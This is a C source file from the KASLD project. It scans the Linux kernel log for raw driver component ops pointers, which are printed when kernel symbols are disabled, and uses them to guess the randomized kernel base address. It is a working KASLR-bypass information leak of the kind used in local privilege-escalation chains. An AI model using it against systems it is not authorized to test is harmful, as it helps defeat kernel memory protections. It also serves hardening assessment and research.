// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for driver component ops pointers.
//
// The `component_bind` and `__component_add` functions print ops functions
// to the kernel log:
//
//   dev_dbg(master->parent, "binding %s (ops %ps)\n",
//   dev_info(master->parent, "bound %s (ops %ps)\n",
//   dev_err(master->parent, "failed to bind %s (ops %ps): %d\n",
//   dev_dbg(dev, "adding component (ops %ps)\n", ops);
//
// The "%ps" printk format prints the symbol name; however, if kernel symbols
// are disabled (CONFIG_KALLSYMS=n) then raw pointers are printed instead.
//
// Kernels may be compiled without debugging symbols to decrease the size of
// the kernel image.
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
// - CONFIG_KALLSYMS=n
//
// References:
// https://elixir.bootlin.com/linux/v5.15.12/source/drivers/base/component.c
// https://cateee.net/lkddb/web-lkddb/KALLSYMS.html
// https://www.kernel.org/doc/html/latest/core-api/printk-formats.html
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include "include/syslog.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

unsigned long search_dmesg_driver_component_ops() {
  char *syslog;
  char *ptr;
  char *endptr;
  char *ops_buf;
  const char *needle = " (ops 0x";
  int size;
  unsigned long addr = 0;
  unsigned long leaked_addr = 0;

  printf("[.] searching dmesg for driver component ops pointers ...\n");

  if (mmap_syslog(&syslog, &size))
    return 0;

  ptr = strtok(syslog, "\n");
  while ((ptr = strtok(NULL, "\n")) != NULL) {
    ops_buf = strstr(ptr, needle);

    if (ops_buf == NULL)
      continue;

    leaked_addr = strtoul(&ops_buf[strlen(needle)], &endptr, 16);

    if (!leaked_addr)
      continue;

    if (leaked_addr >= KERNEL_BASE_MIN && leaked_addr <= KERNEL_BASE_MAX) {
      // printf("Found kernel pointer: %lx\n", leaked_addr);
      if (!addr || leaked_addr < addr)
        addr = leaked_addr;
    }
  }

  return addr;
}

int main(int argc, char **argv) {
  unsigned long addr = search_dmesg_driver_component_ops();
  if (!addr)
    return 1;

  printf("lowest leaked address: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);

  return 0;
}
